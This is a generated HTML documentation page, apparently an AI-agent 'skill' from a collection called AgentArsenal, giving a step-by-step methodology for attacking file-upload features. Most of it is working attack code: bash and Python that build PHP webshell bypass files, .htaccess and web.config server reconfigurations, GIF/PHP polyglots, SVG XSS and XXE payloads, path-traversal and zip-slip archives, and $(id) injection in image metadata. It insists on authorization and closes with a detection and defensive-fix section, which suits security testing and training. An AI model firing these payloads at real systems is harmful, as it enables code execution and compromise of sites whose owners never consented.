@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: file-upload-attacks</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>file-upload-attacks</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing file upload functionality on an authorized</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="webapp-pentest-methodology.html">webapp-pentest-methodology</a> <a href="secure-coding.html">secure-coding</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr><tr><td>ffuf</td><td>2.1.0</td></tr></tbody></table><p>File upload is one of the highest-value web targets: a single missed check turns into remote code execution, stored XSS served from the trusted domain, or server-side request forgery through parsed file formats. Applications typically validate the wrong property (the extension, the claimed MIME type) while the server executes based on a different one (the real content, the storage path). This skill covers the authorized methodology: mapping upload surfaces, defeating each validation layer in order, crafting polyglots, and proving impact without damaging the target. All testing targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Map every upload surface: avatars, attachments, imports, document</li>
+<p>converters, and any feature that accepts a file or a URL to fetch.</p>
+<li>Upload a benign file and record the full behavior: accepted types,</li>
+<p>renamed or not, stored where, served from which URL, with which Content-Type.</p>
+<li>Test extension validation with the bypass ladder in section 2.</li>
+<li>Test MIME type and magic byte validation with the bypasses in</li>
+<p>section 3.</p>
+<li>Try polyglot files that are valid images and valid scripts at once.</li>
+<li>Test SVG uploads for stored XSS and XXE.</li>
+<li>Test filename traversal, zip extraction, and XML-based formats.</li>
+<li>Prove impact safely: a benign marker file or a stored XSS alert in</li>
+<p>your own test session, never a real shell on a shared target unless the rules of engagement explicitly allow it.</p>
+</ol>
+<h2>1. Mapping the upload surface</h2>
+<p>Before attacking, learn exactly what the application does with a file.</p>
+<pre><code class="language-bash"># Upload a benign PNG and capture where it lands
+curl -s -b &#x27;session=YOUR_TEST_SESSION&#x27; -X POST \
+  &#x27;https://target.example/profile/avatar&#x27; \
+  -F &#x27;avatar=@/tmp/test.png;type=image/png&#x27; | head -c 500</code></pre>
+<pre><code class="language-bash"># Fetch the served file back and inspect the headers the server sets
+curl -si &#x27;https://target.example/uploads/abc123.png&#x27; | head -12</code></pre>
+<p>Record: the upload endpoint and parameter name, size limits (test with a 1-byte and an oversized file), whether the filename is preserved or randomized, the serving URL pattern, the <code>Content-Type</code> and <code>Content-Disposition</code> on download, and whether the file is processed (resized, converted, thumbnailed), because processing both destroys some payloads and creates new parser attack surface.</p>
+<h2>2. Extension validation bypass ladder</h2>
+<p>Work through these in order against the live filter. Each defeats a different naive check.</p>
+<pre><code class="language-bash"># Baseline: does a plain .php upload get rejected?
+curl -s -b &#x27;session=YOUR_TEST_SESSION&#x27; -X POST \
+  &#x27;https://target.example/profile/avatar&#x27; \
+  -F &#x27;avatar=@/tmp/shell.php;type=application/x-php&#x27; | head -c 200</code></pre>
+<pre><code class="language-bash"># Prepare the bypass corpus once, reuse everywhere
+mkdir -p /tmp/up &amp;&amp; cd /tmp/up
+echo &#x27;GIF89a &lt;?php echo &quot;MARKER&quot;; ?&gt;&#x27; &gt; shell.gif.php
+cp shell.gif.php &#x27;shell.php.gif&#x27;      # double extension
+cp shell.gif.php &#x27;shell.pHp&#x27;          # case trick
+cp shell.gif.php &#x27;shell.php5&#x27;         # alternate handler
+cp shell.gif.php &#x27;shell.phtml&#x27;        # alternate handler
+cp shell.gif.php &#x27;shell.phar&#x27;         # phar deserialization vector
+cp shell.gif.php &#x27;shell.php.&#x27;         # trailing dot (Windows strips it)
+cp shell.gif.php &#x27;shell.php%00.gif&#x27;   # null byte (legacy stacks only)
+printf &#x27;AddType application/x-httpd-php .evil\n&#x27; &gt; .htaccess
+printf &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;configuration&gt;&lt;system.webServer&gt;&lt;handlers&gt;&lt;add name=&quot;e&quot; path=&quot;*.evil&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%%SystemRoot%%\\system32\\inetsrv\\asp.dll&quot; resourceType=&quot;Unspecified&quot; /&gt;&lt;/handlers&gt;&lt;/system.webServer&gt;&lt;/configuration&gt;&#x27; &gt; web.config
+ls /tmp/up</code></pre>
+<pre><code class="language-bash"># Fire each candidate and log which ones the filter accepts
+for f in /tmp/up/*; do
+  echo &quot;== $(basename $f) ==&quot;
+  curl -s -o /dev/null -w &#x27;%{http_code}\n&#x27; \
+    -b &#x27;session=YOUR_TEST_SESSION&#x27; -X POST \
+    &#x27;https://target.example/profile/avatar&#x27; \
+    -F &quot;avatar=@$f&quot;
+done</code></pre>
+<p>Notes per technique: double extensions defeat <code>endswith(&quot;.php&quot;)</code> blocklists when the server executes on the first extension; case tricks defeat lowercase-only comparisons; <code>.phtml</code>, <code>.php5</code>, <code>.phar</code> defeat blocklists that enumerate only <code>.php</code>; <code>.htaccess</code> and <code>web.config</code> uploads reconfigure the server itself to execute your chosen extension; null bytes only work on legacy C-based stacks and old Java versions.</p>
+<h2>3. MIME type and magic byte bypasses</h2>
+<p>When the filter checks the claimed <code>Content-Type</code> or the file&#x27;s magic bytes, lie about both while keeping executable content.</p>
+<pre><code class="language-bash"># Claim image/png for a PHP file (defeats Content-Type checks)
+curl -s -b &#x27;session=YOUR_TEST_SESSION&#x27; -X POST \
+  &#x27;https://target.example/profile/avatar&#x27; \
+  -F &#x27;avatar=@/tmp/up/shell.php;type=image/png&#x27; | head -c 200
+
+# Valid PNG magic bytes followed by PHP (defeats naive magic checks)
+printf &#x27;\x89PNG\r\n\x1a\n&lt;?php echo &quot;MARKER&quot;; ?&gt;&#x27; &gt; /tmp/up/magic.php
+curl -s -b &#x27;session=YOUR_TEST_SESSION&#x27; -X POST \
+  &#x27;https://target.example/profile/avatar&#x27; \
+  -F &#x27;avatar=@/tmp/up/magic.php;type=image/png&#x27; | head -c 200</code></pre>
+<pre><code class="language-bash"># Polyglot GIF/PHP: valid GIF89a header, PHP in a comment block.
+# Image processors keep it; PHP executes it if served as .php
+printf &#x27;GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;&#x27; &gt; /tmp/up/poly.gif
+echo &#x27;&lt;?php echo &quot;MARKER&quot;; ?&gt;&#x27; &gt;&gt; /tmp/up/poly.gif
+file /tmp/up/poly.gif</code></pre>
+<p>If the application resizes images, the polyglot may not survive; test whether the served file still contains your marker with <code>curl | grep</code>. EXIF-based payloads (<code>exiftool -Comment=&#x27;&lt;?php ... ?&gt;&#x27;</code>) survive some processors that strip trailing data.</p>
+<h2>4. SVG stored XSS and XXE</h2>
+<p>SVG is XML, so an uploaded SVG runs script in the victim&#x27;s browser when served from the application&#x27;s domain, and its XML parser may resolve external entities.</p>
+<pre><code class="language-bash"># SVG stored XSS probe (use your test session; check in a second browser)
+cat &gt; /tmp/up/xss.svg &lt;&lt;&#x27;EOF&#x27;
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert(document.domain)&quot;/&gt;
+EOF
+curl -s -b &#x27;session=YOUR_TEST_SESSION&#x27; -X POST \
+  &#x27;https://target.example/profile/avatar&#x27; \
+  -F &#x27;avatar=@/tmp/up/xss.svg;type=image/svg+xml&#x27; | head -c 200</code></pre>
+<pre><code class="language-bash"># SVG XXE probe: point the entity at your local listener, read the reply
+cat &gt; /tmp/up/xxe.svg &lt;&lt;&#x27;EOF&#x27;
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE svg [&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8000/xxe-ping&quot;&gt;]&gt;
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;
+EOF
+# In another terminal: python3 -m http.server 8000, then upload and watch
+curl -s -b &#x27;session=YOUR_TEST_SESSION&#x27; -X POST \
+  &#x27;https://target.example/profile/avatar&#x27; \
+  -F &#x27;avatar=@/tmp/up/xxe.svg;type=image/svg+xml&#x27; | head -c 200</code></pre>
+<p>If the SVG is served with <code>Content-Type: image/svg+xml</code> and no <code>Content-Disposition: attachment</code>, script executes in the site&#x27;s origin: stored XSS. If your listener receives the XXE ping, the XML parser resolves external entities: XXE. Both are reportable on their own.</p>
+<h2>5. Filename traversal and archive extraction</h2>
+<p>Filenames are input too. Test what the server does with a hostile name.</p>
+<pre><code class="language-bash"># Path traversal in the filename (watch where the file lands)
+curl -s -b &#x27;session=YOUR_TEST_SESSION&#x27; -X POST \
+  &#x27;https://target.example/profile/avatar&#x27; \
+  -F &#x27;avatar=@/tmp/up/shell.php;filename=&quot;../../../../tmp/pwned.php&quot;;type=image/png&#x27; \
+  | head -c 200
+ls -la /tmp/pwned.php 2&gt;/dev/null || echo &quot;not in /tmp (check the app server in lab)&quot;</code></pre>
+<pre><code class="language-bash"># Zip slip: archive whose entry escapes the extraction directory
+python3 - &lt;&lt;&#x27;EOF&#x27;
+import zipfile
+with zipfile.ZipFile(&#x27;/tmp/up/slip.zip&#x27;, &#x27;w&#x27;) as z:
+    z.writestr(&#x27;../../pwned.txt&#x27;, &#x27;MARKER&#x27;)
+print(&quot;wrote /tmp/up/slip.zip&quot;)
+EOF
+curl -s -b &#x27;session=YOUR_TEST_SESSION&#x27; -X POST \
+  &#x27;https://target.example/bulk/import&#x27; \
+  -F &#x27;archive=@/tmp/up/slip.zip;type=application/zip&#x27; | head -c 200</code></pre>
+<p>Also test Unicode normalization tricks (fullwidth characters, <code>%c0%af</code> overlong UTF-8 on old stacks) and Windows alternate data streams (<code>shell.php:.jpg</code>) where the target runs on Windows.</p>
+<h2>6. XML and document format uploads</h2>
+<p>Office documents, PDFs, and image metadata are parsed server-side, which opens XXE, SSRF, and command injection through the parser.</p>
+<pre><code class="language-bash"># DOCX is a zip of XML: inject an XXE payload into word/document.xml
+cd /tmp/up &amp;&amp; mkdir -p docx/word &amp;&amp; cd docx
+unzip -o -q /tmp/sample.docx
+# Edit word/document.xml to add a DOCTYPE with an external entity,
+# then re-zip and upload the result
+zip -qr /tmp/up/evil.docx .</code></pre>
+<pre><code class="language-bash"># EXIF command injection probe via image metadata (processor-dependent)
+printf &#x27;\x89PNG\r\n\x1a\n&#x27; &gt; /tmp/up/meta.png
+# Add a tEXt chunk carrying a probe string, then upload and watch logs
+python3 - &lt;&lt;&#x27;EOF&#x27;
+import struct, zlib
+def chunk(typ, data):
+    c = struct.pack(&quot;&gt;I&quot;, len(data)) + typ + data
+    return c + struct.pack(&quot;&gt;I&quot;, zlib.crc32(typ + data) &amp; 0xffffffff)
+png = open(&quot;/tmp/up/meta.png&quot;, &quot;rb&quot;).read()
+itxt = b&quot;Comment\x00\x00\x00\x00\x00$(id)&quot;
+open(&quot;/tmp/up/meta.png&quot;, &quot;wb&quot;).write(png + chunk(b&quot;iTXt&quot;, itxt) + chunk(b&quot;IEND&quot;, b&quot;&quot;))
+print(&quot;wrote EXIF probe&quot;)
+EOF</code></pre>
+<p>Keep these probes benign (<code>$(id)</code> in metadata only proves the parser reads the field; actual command execution through image processors is rare and must be demonstrated carefully, never assumed).</p>
+<h2>7. Proving execution safely</h2>
+<p>The evidence ladder, from weakest to strongest, stopping at the first level the rules of engagement allow:</p>
+<ol>
+<li>The filter accepted a bypass file: screenshot the 200 response.</li>
+<li>The served file keeps your marker: <code>curl &lt;served-url&gt; | grep MARKER</code>.</li>
+<li>A harmless script executes: upload <code>&lt;?php echo &quot;MARKER&quot;; ?&gt;</code> (or the</li>
+<p>stack&#x27;s equivalent) and fetch the served URL; <code>MARKER</code> in the response proves code execution.</p>
+<li>Stored XSS fires in your own second test session: the alert box</li>
+<p>screenshot.</p>
+</ol>
+<pre><code class="language-bash"># Verify the marker survived processing and serving
+curl -s &#x27;https://target.example/uploads/&lt;returned-name&gt;&#x27; | grep -c MARKER</code></pre>
+<p>Never drop an interactive shell on a shared engagement target without explicit written permission, never leave uploaded shells behind (delete them through the application&#x27;s own delete feature and confirm with a 404), and never upload real malware.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The file goes to object storage (S3) with a signed URL: execution</li>
+<p>depends on the bucket&#x27;s content serving, so test the actual served URL, not the upload response.</p>
+<li>Antivirus scans uploads asynchronously: the file may 200 first and</li>
+<p>vanish seconds later. Re-check after a delay, and race the scanner only if the engagement allows it.</p>
+<li>Image re-encoding destroys polyglots: confirm with the marker check</li>
+<p>in section 7 rather than assuming the upload worked.</p>
+<li><code>Content-Disposition: attachment</code> on download neuters SVG XSS in</li>
+<p>modern browsers; check the header before claiming stored XSS.</p>
+<li>Chunked or resumable uploads: each chunk may be validated</li>
+<p>separately, so the bypass must survive reassembly.</p>
+<li>Filename randomization defeats guessing the served URL: use the URL</li>
+<p>the application returns, and test whether it is predictable.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Extension filter holds: pivot to <code>.htaccess</code>/<code>web.config</code> upload,</li>
+<p>which changes what the server executes rather than what you upload.</p>
+<li>Content checks hold: pivot to SVG XSS/XXE, which needs no script</li>
+<p>execution on the server at all.</p>
+<li>Everything is re-encoded: attack the parser instead (XXE in DOCX,</li>
+<p>metadata injection, decompression bombs are out of scope unless explicitly allowed).</p>
+<li>Upload requires privileges: test whether a low-privilege test user</li>
+<p>can upload, and whether the served file is reachable unauthenticated, which widens every finding.</p>
+<li>The application fetches a URL you supply (URL upload): pivot to</li>
+<p>SSRF testing, since the fetcher is a new attack surface.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see upload attacks as POSTs with mismatched extensions and content (a <code>.png</code> whose body contains <code>&lt;?php</code>), double extensions in filenames, <code>.htaccess</code> or <code>web.config</code> in upload logs, SVG files with <code>onload</code> handlers or DOCTYPE declarations, and <code>../</code> sequences in filename fields. The durable fixes are an allowlist of extensions and MIME types, verifying magic bytes server-side, randomizing stored filenames, storing uploads outside the web root (or with execution disabled), serving user files with <code>Content-Disposition: attachment</code> and a safe Content-Type, disabling XML external entities in every parser, and scanning uploads with antivirus as defense in depth rather than the primary control.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application): the entry</li>
+<p>point class.</p>
+<li>MITRE ATT&amp;CK T1505.003 (Server Software Component: Web Shell): the</li>
+<p>post-upload persistence technique.</p>
+<li>CWE-434 (Unrestricted Upload of File with Dangerous Type).</li>
+<li>CWE-79 (Cross-site Scripting): SVG stored XSS.</li>
+<li>CWE-611 (Improper Restriction of XML External Entity Reference): SVG</li>
+<p>and DOCX XXE.</p>
+<li>CWE-22 (Improper Limitation of a Pathname to a Restricted Directory):</li>
+<p>filename traversal and zip slip.</p>
+<li>OWASP File Upload Cheat Sheet: validation, storage, and serving</li>
+<p>guidance.</p>
+<li>PortSwigger Web Security Academy: file upload labs and bypass</li>
+<p>cheat sheet.</p>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
